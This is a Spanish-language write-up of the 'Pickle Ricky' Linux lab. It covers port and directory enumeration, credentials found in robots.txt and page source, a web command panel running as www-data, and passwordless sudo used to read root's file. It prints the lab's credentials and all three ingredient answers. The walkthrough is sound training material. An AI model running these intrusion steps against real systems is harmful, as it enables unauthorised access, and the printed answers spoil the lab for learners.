# Pickle Ricky

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux mediante la enumeración de una aplicación web, obtener acceso a un panel con **ejecución remota de comandos (RCE)** y recuperar los tres ingredientes necesarios aprovechando una configuración insegura de **sudo**.

---

## 🛠️ Tecnologías trabajadas

- Gobuster
- Burp Suite
- RCE
- Linux Enumeration
- Sudo
- HTTP

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios: **SSH** y **HTTP**, por lo que el foco principal pasó a ser la aplicación web. Durante la exploración, la propia página sugería prestar atención a las pistas ocultas y utilizar herramientas como Burp Suite, lo que indicaba que gran parte de la información necesaria estaría expuesta en la aplicación.

En lugar de intentar acceder directamente mediante fuerza bruta, decidí recopilar primero toda la información posible revisando el código fuente, los directorios ocultos y los archivos públicos. Esta estrategia permitió obtener tanto el usuario como la contraseña sin necesidad de realizar ataques adicionales.

Una vez dentro del panel descubrí que disponía de una consola capaz de ejecutar comandos directamente sobre el servidor. Como ya existía una **RCE**, no fue necesario generar una reverse shell; toda la enumeración y la obtención de los ingredientes pudo realizarse desde el propio panel.

Finalmente, la revisión de los permisos mediante `sudo -l` reveló que el usuario podía ejecutar cualquier comando como **root** sin introducir contraseña, permitiendo recuperar el último ingrediente de forma inmediata.

Este laboratorio demuestra que una buena enumeración puede eliminar la necesidad de explotar vulnerabilidades complejas.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo de puertos utilizando Nmap.

```bash
nmap -p- 10.129.186.47
```

Los servicios identificados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

Posteriormente profundicé en los servicios detectados.

```bash
nmap -sC -sV -p22,80 10.129.186.47
```

La enumeración confirmó que el objetivo era un sistema Linux con una aplicación web como principal superficie de ataque.

---

### 2. Enumeración web

Accedí a la página principal.

```text
http://10.129.186.47
```

La propia aplicación sugería buscar ingredientes ocultos y utilizar herramientas como **Burp Suite** durante la investigación.

Realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.129.186.47 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

Los recursos más interesantes encontrados fueron:

- `/assets`
- `/robots.txt`

---

### 3. Descubrimiento de credenciales

Al revisar el contenido de `robots.txt` encontré la siguiente cadena:

```text
Wubbalubbadubdub
```

Esta información parecía corresponder a una contraseña.

Posteriormente revisé el código fuente de la página principal y encontré el usuario:

```text
R1ckRul3s
```

Durante la exploración del directorio `/assets` apareció un archivo llamado:

```
portal.jpg
```

Este recurso sugería la existencia de un panel de administración.

Continuando con la enumeración localicé:

```
portal.php
```

y posteriormente:

```
login.php
```

Utilizando las credenciales descubiertas conseguí acceder al panel.

```
Usuario: R1ckRul3s

Contraseña: Wubbalubbadubdub
```

---

### 4. Acceso inicial

Tras autenticarse correctamente apareció una consola capaz de ejecutar comandos directamente sobre el servidor.

La ejecución de:

```bash
whoami
```

confirmó que la RCE se ejecutaba como:

```
www-data
```

Al disponer ya de ejecución remota de comandos no fue necesario generar una reverse shell, pudiendo continuar toda la enumeración desde el propio panel web.

---

### 5. Obtención de los ingredientes

Durante la exploración localicé el primer ingrediente.

El archivo correspondiente era:

```
Sup3rS3cretPickl3Ingred.txt
```

Sin embargo, el comando `cat` estaba restringido.

Para evitar esta limitación utilicé:

```bash
tac Sup3rS3cretPickl3Ingred.txt
```

obteniendo:

```
mr. meeseek hair
```

Posteriormente revisé el directorio:

```bash
/home/rick
```

donde encontré el archivo:

```
second ingredients
```

Utilizando nuevamente `tac` recuperé el segundo ingrediente.

```bash
tac /home/rick/second\ ingredients
```

Resultado:

```
1 jerry tear
```

---

### 6. Escalada de privilegios

Comprobé los permisos disponibles mediante:

```bash
sudo -l
```

El resultado indicaba que el usuario **www-data** podía ejecutar cualquier comando como **root** sin necesidad de introducir contraseña.

Aproveché esta configuración para leer directamente el archivo que contenía el último ingrediente.

```bash
sudo tac /root/3rd.txt
```

Resultado:

```
fleeb juice
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió reforzar la importancia de la enumeración web y de interpretar correctamente las pistas distribuidas por toda la aplicación.
- Revisar el código fuente en busca de credenciales.
- Utilizar `robots.txt` como fuente de información sensible.
- Descubrir paneles ocultos mediante enumeración de directorios.
- Aprovechar una **RCE** integrada sin necesidad de obtener una reverse shell.
- Adaptarse a las restricciones del entorno utilizando comandos alternativos como `tac`.
- Revisar siempre los permisos mediante `sudo -l`.
- Comprender el impacto de una configuración insegura de `sudo`.
 proporcionar acceso completo al sistema de forma inmediata.
